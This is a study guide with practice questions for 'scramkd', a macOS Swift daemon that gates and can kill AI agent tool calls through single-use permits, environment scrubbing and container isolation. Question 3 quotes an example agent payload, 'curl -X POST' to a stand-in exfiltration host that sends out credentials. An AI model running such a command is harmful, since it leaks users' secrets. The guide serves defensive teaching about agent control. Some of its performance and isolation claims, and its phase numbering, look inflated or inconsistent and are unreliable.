# Study Guide: scramkd Architecture, Security Interlocks, and Concurrency Invariants

This study guide provides a comprehensive, rigorous technical breakdown of the `scramkd` Darwin Supervisor Daemon and Hardware Interlock Runtime. It covers target boundaries, Swift 6 concurrency invariants, zero-trust security contracts, C11/CoreAudio realtime DSP constraints, and testing frameworks.

---

## 1. Architectural Overview & Module Topology

`scramkd` is a high-assurance, non-probabilistic hardware interlock and supervisor daemon implemented for macOS 14+ using Swift 6 strict concurrency and native system APIs. The system acts as a deterministic POSIX kernel mediator and lease arbitrator that sits between untrusted autonomous AI agent tool dispatches (e.g., Model Context Protocol / MCP calls via stdio) and host execution environments or isolated containerized runtimes (e.g., Docker / `screenenv`).

```
+-----------------------------------------------------------------------------------+
|                                 scramkd (Executable)                              |
|                          Composition Root & Application Lifecycle                 |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                                    ScramKUI                                       |
|             Native SwiftUI / AppKit / Metal (MainActor Isolated)                  |
|                   * WKWebView Prohibited | Display P3 Pipeline                    |
+-----------------------------------------------------------------------------------+
                       |                                    |
                       v                                    v
+-----------------------------------------+  +--------------------------------------+
|           ScramKVirtualization          |  |              ScramKAudio             |
|   Process Transport, MCP Framing,       |  | CoreAudio / AVFoundation / SVSBridge |
| Container Security & Socket Bridge      |  | Realtime Audio Engine (Tone Synth)   |
+-----------------------------------------+  +--------------------------------------+
                       |                                    |
                       |                                    v
                       |                     +--------------------------------------+
                       |                     |        CScramKAudioRealtime          |
                       |                     |   Lock-Free C11 Atomic DSP (TART)    |
                       |                     +--------------------------------------+
                       \                                    /
                        \                                  /
                         v                                v
+-----------------------------------------------------------------------------------+
|                                   ScramKCore                                      |
|    Pure Swift/Foundation: Synchronization, HardwareInterlockGate, PermissivePermit  |
+-----------------------------------------------------------------------------------+
```

### Module Responsibilities & Dependency Rules

| Target Name | Core Dependencies | Primary Responsibilities | Prohibited Dependencies / Constraints |
| :--- | :--- | :--- | :--- |
| `ScramKCore` | Pure Swift / Foundation | Low-level synchronization, actor-isolated state transitions, single-use `PermissivePermit` issuance, `ActiveHoldPolicy`, telemetry frames. | No UI, Audio, Virtualization, or AppKit/SwiftUI frameworks. |
| `ScramKVirtualization` | `ScramKCore` | Loopback socket transport (`ContainerSocketBridge`), `ContainerSecurityProfile`, JSON-RPC/MCP AST policy inspection, 7-key environment allowlisting, constant-time SHA-256 validation. | No UI or Audio framework dependencies. |
| `ScramKAudio` | `ScramKCore`, `CScramKAudioRealtime`, AVFoundation, CoreAudio | Tactical cue synthesizer (`ScramKToneSynthesizer`), `SVSBridge` interlock integration, `LocalVoiceCommander`. | No UI dependencies. |
| `CScramKAudioRealtime` | C11 Standard Library (`.c11`) | Low-level lock-free C11 atomic audio render pipeline (`TART`). | No locks, allocations (`malloc`), file/network I/O, Swift runtime, or actor calls in render callback. |
| `ScramKUI` | `ScramKCore`, `ScramKVirtualization`, AppKit, SwiftUI, Metal, MetalKit | Native 3-Tier Progressive Disclosure HUD (1440x900 canvas), `ConsoleSafetyCockpit`, Metal viewport (`ScramKMetalViewport`), Design Tokens. | **`WKWebView` is strictly prohibited**. Explicitly isolated to `@MainActor`. |
| `scramkd` | All `ScramK*` Libraries | Composition root for daemon/subsystem, window lifecycle, and input routing. | No duplicate interlock implementations. |
| `scramkctl` | `ScramKCore` | Operator CLI executable for status inspection, lease granting, and emergency abort (`status`, `grant`, `abort`). | Non-interactive command interface linking strictly against `ScramKCore`. |

---

## 2. Key Concepts & System Invariants

### 2.1 Concurrency, Isolation, and Locking Mechanics
1. **Swift 6 Complete Strict Concurrency**: The codebase is compiled under `-strict-concurrency=complete`. All data structures crossing isolation boundaries must strictly conform to `Sendable`. 
2. **Actor State Isolation**: Safety and transport states are owned by Swift actors. AppKit, SwiftUI, controllers, and visual components are isolated to `@MainActor`. Unjustified `@unchecked Sendable`, `nonisolated(unsafe)`, or diagnostic suppressions are banned.
3. **OSAllocatedUnfairLock**: Synchronous critical sections (such as single-shot continuation settlement in `ContinuationWaiter` and `OneShotGate`) must use `OSAllocatedUnfairLock`. 
   * **Inviolable Lock Invariant**: An unfair lock must **never** be held across an `await` suspension point, nor may locks be used to bypass or replace actor isolation.
4. **Continuation Management**: `ContinuationWaiter` and `AudioWaitSignal` enforce exactly-once continuation resolution through atomic state locks, preventing continuation double-resume crashes or leaks under racing cancellation tasks.

### 2.2 Security Architecture & Zero-Trust Interlock Pipeline
The security pipeline provides a deterministic, physical-grade air gap for agent tool execution:

* **Startup Baseline**: The system always boots into a locked, detached state with output audio disabled. No automatic arming, granting, or abort resets are permitted.
* **Single-Use `PermissivePermit`**: Issued by the `HardwareInterlockGate`. A grant is non-reusable and bound to a single tool invocation request. Bare core grants never automatically release pending requests without explicit request-bound clearance (`BridgeRequestLease`).
* **Constant-Time Cryptographic Verification**: Inbound MCP/tool approval keys are verified using constant-time SHA-256 hex comparison (`ContainerSocketBridge.approve(_:)`) to prevent timing side-channel attacks on authorization claims.
* **Subprocess Environment Scrubbing**: Subprocess transport (`MCPProcessTransport`) enforces a strict 7-key environment allowlist (`DefaultSubprocessCommandExecutor`), stripping all untrusted host environment variables prior to execution.
* **Container Isolation Profiles**: `ContainerSecurityProfile` enforces strict separation between `strictAirgap` (zero network interfaces) and `loopbackFramebuffer` (strictly bound to `127.0.0.1:7860`). Non-loopback proxies, redirects, or forwarding of guest keyboard, pointer, or clipboard data are blocked.
* **POSIX Kernel Mediation Latency**: Hardware interlock trip latency is deterministically bounded to `< 384 µs`.

### 2.3 Realtime C11 / CoreAudio Architecture (`TART`)
High-assurance realtime audio generation is handled by the `CScramKAudioRealtime` C11 library and managed by `ScramKAudio`:

* **Render Callback Constraints**: The audio render callback (`tart_render`) operates on a realtime thread. It must be zero-allocation and lock-free (`tart_atomics_are_lock_free`). It is explicitly forbidden from performing:
  1. Memory allocation (`malloc`, `calloc`, or Swift heap allocations).
  2. Mutex locking (`os_unfair_lock`, `pthread_mutex`, etc.).
  3. Swift actor, `Task`, or async runtime calls.
  4. File system, network, or console I/O.
* **Two-Phase Quiescent Memory Reclamation**: Storage lifecycle (`AudioRealtimeStorage` / `AudioReclamationControl`) uses non-owning raw C addresses (`AudioRawAddress`). C storage destruction requires explicit two-phase proof of detachment (`tart_mark_producer_detached` AND `tart_mark_callback_retired`). Memory is freed exclusively on the control actor (`AudioReclamationControl`) once `tart_is_quiescent` returns true.
* **Tone Catalog & Waveform Synthesis**: Band-limited oscillator profiles support `.sine`, `.saw`, and `.square` waveforms with configurable attack/release envelope frames. Supported audio catalog cues include:

| Tone Cue | Frequency A / B (Hz) | Duration (s) | Segments / Waveform | Priority |
| :--- | :--- | :--- | :--- | :--- |
| `armedPulse` | 440 / 440 | 0.15 | 1 / Sine | 1 |
| `permissivePulse` | 880 / 880 | 0.20 | 1 / Sine | 1 |
| `emergencyAbortTrip` | 1200 / 1200 | 0.50 | 1 / Sawtooth | 4 (Highest) |
| `masterCaution` | 660 / 880 | 0.25 | 2 / Sine | 2 |
| `masterWarning` | 880 / 660 | 0.125 | 8 / Sine | 3 |
| `altitudeAlert` | 500 / 500 | 0.30 | 1 / Sine | 1 |
| `terrainProximity` | 1000 / 1000 | 0.80 | 1 / Sawtooth | 1 |
| `ping` | 880 / 880 | 0.10 | 1 / Sine | 1 |

### 2.4 User Interface, Display P3 Pipeline, & Metal Constraints
* **Geometry**: Fixed 1440x900 logical-point content canvas divided into vertical tiers (44px header rail, 580px main stage, 276px audit/drawer) and horizontal layout columns (160px rail, 794px center viewport, 486px cockpit).
* **Display P3 Transformation**: Color management converts sRGB references into the Display P3 presentation pipeline without reinterpreting RGB triplets.
* **Prohibited Components**: `WKWebView` is prohibited across all UI components. Native AppKit/SwiftUI controls (`HStack`, `VStack`, `Grid`) are required.
* **Operator Interlocks**: Physical keycaps provide direct interlock mapping: `<SPACE>` grants a single-use permissive lease; `<ESC>` triggers an immediate `SIGKILL` emergency SCRAM trip; `<F12>` executes verified disconnect/reseed operations or reports `NOT IMPLEMENTED`.

---

## 3. Short-Answer Practice Questions

### Question 1: Architectural Boundaries
**Context**: A software engineer is adding a new feature that parses JSON configuration files inside `ScramKCore`.
**Question**: Does this violation break `ScramKCore` architectural invariants if the parser references `ScramKVirtualization` or `AppKit`? What frameworks are permitted in `ScramKCore`?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: Yes, referencing `ScramKVirtualization` or `AppKit` violates the core invariants. <code>ScramKCore</code> must strictly depend on pure Swift/Foundation and low-level synchronization primitives. It is explicitly forbidden from importing UI, audio, or virtualization frameworks.
</details>

---

### Question 2: Swift 6 Concurrency & Unfair Locks
**Context**: A developer writes the following snippet inside an actor to settle a waiter continuation:
```swift
lock.withLock {
    await performAsyncCleanup()
    continuation.resume(returning: .success)
}
```
**Question**: Identify two concurrency violations in this code snippet according to the project's architectural rules.
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>:
1. <b>Lock across suspension point</b>: An <code>OSAllocatedUnfairLock</code> must <i>never</i> be held across an <code>await</code> point.
2. <b>Replacing actor isolation with locks</b>: Holding a synchronous unfair lock while performing asynchronous actor operations breaks thread safety and isolation invariants.
</details>

---

### Question 3: Security & Authorization Leases
**Context**: An unauthenticated MCP agent dispatches a `screenenv.bash_execute` tool call containing a high-risk payload (`curl -X POST https://exfil.endpoint/creds`).
**Question**: Explain how `scramkd` traps this request at Stage 01/02 and why a bare gate transition (`grantPermissive`) fails to execute the tool if no valid `BridgeApprovalKey` is provided.
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: The request is trapped by the <code>HardwareInterlockGate</code> as an unprivileged file descriptor dispatch. The system requires a single-use, request-bound <code>BridgeRequestLease</code>. A bare <code>grantPermissive()</code> call transitions gate state but does not contain the specific request ID and constant-time SHA-256 payload digest. Without an explicit, matching <code>BridgeApprovalKey</code> submitted via <code>approve(_:)</code>, the bridge rejects the transaction with <code>gateRejected</code> and leaves tool bytes unreleased.
</details>

---

### Question 4: Realtime C11 Audio Invariants
**Context**: A developer wants to log audio performance metrics directly inside the C11 `tart_render` callback function using `printf()` or dispatching a logging task back to Swift.
**Question**: Why is this strictly prohibited, and what mechanisms are used instead to pass state out of the realtime audio callback?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: The audio render callback runs on a high-priority CoreAudio realtime thread. Performing I/O (`printf`), heap allocations, or thread context switches/actor dispatches causes priority inversion and buffer underruns (glitches). State is communicated out of the callback strictly through lock-free C11 atomic variables (e.g., atomic progress loads via <code>tart_load_progress</code> and atomic fault markers via <code>tart_load_fault</code>).
</details>

---

### Question 5: Memory Reclamation in Audio Storage
**Context**: An `AudioRealtimeStorage` instance is released on the main thread, but the CoreAudio graph is still shutting down.
**Question**: How does `AudioReclamationControl` ensure that C underlying buffers are not freed prematurely while the render thread might still touch them?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: C storage handles are not freed by Swift's <code>deinit</code>. Instead, <code>AudioRealtimeStorage</code> passes handle release tracking to <code>AudioReclamationControl</code>. Destruction of C memory occurs exclusively on the <code>AudioReclamationControl</code> actor only after two conditions are proven true: the Swift handle is released AND <code>tart_is_quiescent()</code> verifies that both the producer is detached (<code>tart_mark_producer_detached</code>) and the native C render callback is retired (<code>tart_mark_callback_retired</code>).
</details>

---

### Question 6: Subprocess Environment Scrubbing
**Context**: An autonomous agent relies on the host environment variable `AWS_SECRET_ACCESS_KEY` to execute a local container build.
**Question**: What happens to this environment variable when `MCPProcessTransport` launches a subprocess via `DefaultSubprocessCommandExecutor`?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: The variable is scrubbed and dropped. <code>MCPProcessTransport</code> enforces a strict 7-key environment allowlist. Any host environment variable outside this allowlist (including credential keys like <code>AWS_SECRET_ACCESS_KEY</code>) is purged to enforce zero-trust execution boundaries.
</details>

---

### Question 7: Keycap Parity & Emergency Actions
**Context**: An operator presses the `<ESC>` key while an MCP tool call is suspended in the hardware interlock gate awaiting approval.
**Question**: What exact signal is issued, and how does the interlock process this command?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: Pressing `<ESC>` triggers an immediate Emergency SCRAM. The system issues a non-catchable `SIGKILL` signal to the execution target, immediately drains all pending waiter continuations via atomic interlock state update, purges the transport pipe, and transitions the gate status to emergency trip while synthesizing the `.emergencyAbortTrip` audio siren (1200 Hz sawtooth).
</details>

---

### Question 8: Metal Render Engine Fault Handling
**Context**: A macOS system running `scramkd` loses its Metal device context or encounters an unallocated drawable during a display resize.
**Question**: What is the required error handling behavior for `ScramKMetalViewport`?
<details>
<summary><b>View Answer</b></summary>
<b>Answer</b>: The viewport must handle missing Metal devices or unallocated drawables gracefully without crashing or throwing unhandled exceptions. It must cache pipelines, queues, and render resources, clear or render fallback state primitives, and report the device unavailability status without inventing guest-display capabilities.
</details>

---

## 4. Essay Prompts for Deeper Exploration

### Essay Prompt 1: Deterministic Mediation vs. Probabilistic LLM Guardrails
> **Prompt**: Analyze why traditional LLM security frameworks based on secondary conversational guardrails, prompt classifiers, or semantic filters fail to guarantee safety in autonomous agent runtimes. Compare these probabilistic approaches with the deterministic, POSIX kernel-level interlock model implemented in `scramkd`. Address latency budgets (< 384 µs), state machine guarantees, single-use leases (`PermissivePermit`), and constant-time cryptographic verification in your answer.

---

### Essay Prompt 2: Realtime DSP Systems Design under Strict Concurrency
> **Prompt**: Explain the design and lifecycle management of the `CScramKAudioRealtime` (TART) C11 library and its Swift interface `ScramKAudio`. Discuss how lock-free atomics, lock-free ring/SPSC buffers, two-phase quiescent state checking, and actor-isolated reclamation controls (`AudioReclamationControl`) prevent memory leaks, race conditions, and audio buffer glitches on high-priority CoreAudio threads.

---

### Essay Prompt 3: Maker-Breaker Engineering Methodology and Threat Mitigation
> **Prompt**: Evaluate the 5-Phase Maker-Breaker loop (MB-00 through MB-08) used in the development of `scramkd`. Focus on how adversarial red-teaming (e.g., testing TOCTOU races, writer-queue cancellation deadlocks, JSON policy bypasses, and mutation survival gates) enforces zero-trust boundaries across process transport (`MCPProcessTransport`), container security profiles (`ContainerSecurityProfile`), and key verification routines.

---

## 5. Comprehensive Glossary of Important Terms

| Term | Category | Definition & Technical Context |
| :--- | :--- | :--- |
| **`ActiveHoldPolicy`** | Core Security | Policy enforcing bounded hold durations or time-to-live (TTL) limits on authorization grants using authoritative monotonic deadlines. |
| **`AudioRawAddress`** | Realtime Audio | A non-owning, `@unchecked Sendable` pointer wrapper (`OpaquePointer`) used to pass C storage addresses across boundaries without triggering ARC heap operations. |
| **`AudioReclamationControl`** | Realtime Audio | An actor responsible for the safe, exclusive destruction of C11 realtime audio storage memory once handles are dropped and callback quiescence is proven. |
| **`BridgeApprovalKey`** | Virtualization | A composite token consisting of a `requestID`, a constant-time SHA-256 payload digest, and a `connectionGeneration` required to unlock a suspended tool call. |
| **`BridgeRequestLease`** | Virtualization | A request-bound authorization claim that pairs a single-use `PermissivePermit` with a specific MCP/JSON-RPC payload. |
| **`ContainerSecurityProfile`** | Virtualization | Policy defining sandbox isolation bounds, enforcing either `strictAirgap` (zero networking) or `loopbackFramebuffer` (strictly bound to `127.0.0.1:7860`). |
| **`ContinuationWaiter`** | Concurrency | A thread-safe synchronization primitive that uses `OSAllocatedUnfairLock` to ensure a Swift `CheckedContinuation` is resumed exactly once. |
| **`CScramKAudioRealtime`** | C11 Realtime | The underlying C11 atomic library (`TART`) providing lock-free waveform synthesis and audio buffer rendering without heap allocations or system locks. |
| **`DefaultSubprocessCommandExecutor`** | Virtualization | Subprocess executor that enforces environment scrubbing, permitting only 7 explicit environment keys to pass into child processes. |
| **`Display P3`** | Visual Pipeline | Wide-gamut color space used across AppKit, SwiftUI, and Metal render pipelines in `ScramKUI`. |
| **`HardwareInterlockGate`** | Core Security | The central actor-isolated state machine that controls system gate states (`locked`, `armed`, `permissive`, `emergencyAbort`) and arbitrates tool dispatches. |
| **`MCPNonblockingWriter`** | Virtualization | A cancellation-safe, asynchronous frame writer that queues and serializes outbound JSON-RPC/MCP payloads without deadlocking writer queues. |
| **`OneShotGate`** | Concurrency | A single-use synchronization gate utilizing `OSAllocatedUnfairLock` to coordinate single-dispatch events and atomic state transitions. |
| **`OSAllocatedUnfairLock`** | Concurrency | An explicit low-level lock used exclusively for non-suspending synchronous critical sections in Swift 6. Must never span across `await` points. |
| **`PermissivePermit`** | Core Security | A single-use, non-reusable security permit issued by `HardwareInterlockGate` to grant clearance for one specific tool dispatch. |
| **`scramkctl`** | CLI Executable | Operator command-line interface linked against `ScramKCore` used to inspect status (`status`), issue single grants (`grant`), or trigger emergency SCRAM (`abort`). |
| **`ScramKAudio`** | Module Target | Swift module interfacing CoreAudio/AVFoundation with `CScramKAudioRealtime` to provide tactical audio cue synthesis (`ScramKToneSynthesizer`). |
| **`ScramKCore`** | Module Target | Pure Swift/Foundation core package containing primary state actors, interlock gates, policies, and synchronization primitives. |
| **`ScramKUI`** | Module Target | `@MainActor`-isolated visual target containing native SwiftUI 3-Tier HUD, `ConsoleSafetyCockpit`, Design Tokens, and Metal viewports. Prohibits `WKWebView`. |
| **`ScramKVirtualization`** | Module Target | Virtualization and transport layer managing socket bridges, MCP framing, JSON policy inspection, and container security. |
| **`SVSBridge`** | Realtime Audio | Synthesizer Virtualization System bridge connecting interlock state transitions on `HardwareInterlockGate` to `ScramKToneSynthesizer` cue triggers. |
| **`TART`** | Realtime Audio | Acronym for *Tactical Audio RealTime*; internal designation for the C11 lock-free audio engine (`CScramKAudioRealtime`). |
| **`tart_is_quiescent`** | Realtime Audio | C11 atomic function verifying that both the producer has detached and the CoreAudio callback has retired, certifying memory is safe to free. |
| **`TelemetryFrame`** | Core Security | An immutable data structure conveying real-time subsystem health metrics, sequence numbers, and interlock states across modules. |